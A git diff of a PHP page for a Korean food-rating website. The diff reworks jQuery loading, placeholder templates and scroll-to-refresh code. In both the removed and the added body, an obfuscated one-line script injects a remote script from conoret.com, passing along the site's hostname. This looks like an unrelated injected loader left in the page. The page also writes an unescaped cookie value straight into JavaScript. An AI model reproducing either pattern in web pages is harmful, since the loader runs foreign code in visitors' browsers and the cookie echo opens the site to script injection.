@@ -69,56 +69,10 @@ include 'script/modules/CookieManager.php';
             }
         </style>
 
-        <script
-                src="https://code.jquery.com/jquery-3.6.0.min.js"
-                integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
-                crossorigin="anonymous"></script>
+        <script src="https://code.jquery.com/jquery-3.6.1.js" integrity="sha256-3zlB5s2uwoUzrXK3BT7AX3FyvojsraNFxCc2vC/7pNI=" crossorigin="anonymous"></script>
         <script type="text/javascript">
-            let src;
-            let rating_info_json={};
-            let foods={}
-            let before_left='/src/rate_star_before.png';
-            let before_right='/src/rate_star_before.png';
-            let after_left='/src/rate_star_after.png';
-            let after_right='/src/rate_star_after.png';
-            let score=-1;
-
-            let id = <?php echo $_COOKIE['user_id']?>
-
-        </script>
-        <script type="text/javascript" src="/script/rating.js"></script>
-    </head>
-
-    <body class="text-center vsc-initialized" cz-shortcut-listen="true">
-        <script type="text/javascript">
-            window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
-        </script>
-    <div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
-        <header class="masthead mb-auto">
-            <div class="inner">
-                <a href="http://ssossotable.com/rating.php"><h3 class="masthead-brand">소소식탁</h3></a>
-                <nav class="nav nav-masthead justify-content-center">
-                    <a class="nav-link active" href="http://ssossotable.com/rating.php">음식 평가하기</a>
-                    <a class="nav-link text-muted" href="http://ssossotable.com/insert.php">음식 추가하기</a>
-                    <a class="nav-link text-muted" href="http://ssossotable.com/record.php">식사 기록하기</a>
-                    <div class="dropdown">
-                        <button class="btn btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" style="border-color: transparent;background-color: transparent;"></button>
-                        <ul class="dropdown-menu" style="">
-                            <li><a class="dropdown-item" href="http://ssossotable.com/myInfo.php">내 정보</a></li>
-                            <li><a class="dropdown-item" href="http://ssossotable.com/friends.php">친구 목록</a></li>
-                            <li><a class="dropdown-item" href="http://ssossotable.com/diary.php">다이어리</a></li>
-                        </ul>
-                    </div>
-                </nav>
-            </div>
-        </header>
-
-        <main role="main" class="inner cover" id="rating" style="margin-top: 20px;">
-            <script>
-                init()
-            </script>
-            <div class="p-3 bg-light" id="scroll_layout">
-                <div class="rating-placeholders">
+            let rating_placeHolder=`
+            <div class="rating-placeholders">
                     <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                         <div style="display: inline-block; margin: 0;" class="food-image">
                             <img src="/src/food_placeholder.png" height="60" width="60">
@@ -211,7 +165,108 @@ include 'script/modules/CookieManager.php';
                         </div>
                     </div>
                 </div>
+            `
+            let loading=`
+            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
+                <div style="display: inline-block; margin: auto;" class="food-image">
+                    <img src="/src/loading.gif" height="90" width="90">
+                </div>
             </div>
+            `
+            let src=null;
+            let rating_info=null;
+            let keys=null;
+            let rating_info_json={};
+            let foods={}
+            let before_left='/src/rate_star_before.png';
+            let before_right='/src/rate_star_before.png';
+            let after_left='/src/rate_star_after.png';
+            let after_right='/src/rate_star_after.png';
+            let score=-1;
+
+            let id = <?php echo $_COOKIE['user_id']?>
+
+            let ratingIdx=0
+            let lim=0
+
+        </script>
+        <script type="text/javascript" src="/script/rating.js"></script>
+    </head>
+
+    <body class="text-center vsc-initialized" cz-shortcut-listen="true">
+        <script type="text/javascript">
+            window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
+        </script>
+    <div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
+        <header class="masthead mb-auto">
+            <div class="inner">
+                <a href="http://ssossotable.com/rating.php"><h3 class="masthead-brand">소소식탁</h3></a>
+                <nav class="nav nav-masthead justify-content-center">
+                    <a class="nav-link active" href="http://ssossotable.com/rating.php">음식 평가하기</a>
+                    <a class="nav-link text-muted" href="http://ssossotable.com/insert.php">음식 추가하기</a>
+                    <a class="nav-link text-muted" href="http://ssossotable.com/record.php">식사 기록하기</a>
+                    <div class="dropdown">
+                        <button class="btn btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" style="border-color: transparent;background-color: transparent;"></button>
+                        <ul class="dropdown-menu" style="">
+                            <li><a class="dropdown-item" href="http://ssossotable.com/myInfo.php">내 정보</a></li>
+                            <li><a class="dropdown-item" href="http://ssossotable.com/friends.php">친구 목록</a></li>
+                            <li><a class="dropdown-item" href="http://ssossotable.com/diary.php">다이어리</a></li>
+                        </ul>
+                    </div>
+                </nav>
+            </div>
+        </header>
+
+        <main role="main" class="inner cover" id="rating" style="margin-top: 20px;">
+            <script>
+                let lock=false
+                init()
+                $(async function () {
+
+                    // $('#scroll_layout').scroll(async function (event) {
+                    //
+                    //     console.log(event)
+                    //     var scrT = $('#scroll_layout').scrollTop();
+                    //     console.log(scrT); //스크롤 값 확인용
+                    //     console.log($(document).height())
+                    //     console.log($('#scroll_layout').height())
+                    //     console.log($('#scroll_layout').prop('scrollHeight'))
+                    //     if((scrT + $(document).height() > $('#scroll_layout').prop('scrollHeight'))){
+                    //         console.log('bottom')
+                    //         $('html, #scroll_layout').animate({
+                    //             scrollTop: 0
+                    //         }, 1000);
+                    //         // $("#scroll_layout").scrollTop(0);
+                    //
+                    //         refresh()
+                    //         $(this).off(event);
+                    //         //스크롤이 끝에 도달했을때 실행될 이벤트
+                    //     } else {
+                    //         // console.log('ntop')
+                    //         //아닐때 이벤트
+                    //     }
+                    //     if(scrT===0) {
+                    //         $(this).on(event);
+                    //     }
+                    // });
+
+
+                    $('#scroll_layout').scroll(function() {
+                        if($('#scroll_layout').scrollTop() + $('main').height() === $('#scroll_layout').prop('scrollHeight')) {
+                            $('html, #scroll_layout').animate({
+                                scrollTop: 0
+                            }, 1000);
+                            refresh()
+                        }
+                    });
+                })
+            </script>
+            <div class="p-3 bg-light" id="scroll_layout">
+
+            </div>
+            <script>
+                document.getElementById('scroll_layout').innerHTML=rating_placeHolder
+            </script>
         </main>
 
         <footer class="mastfoot mt-auto">
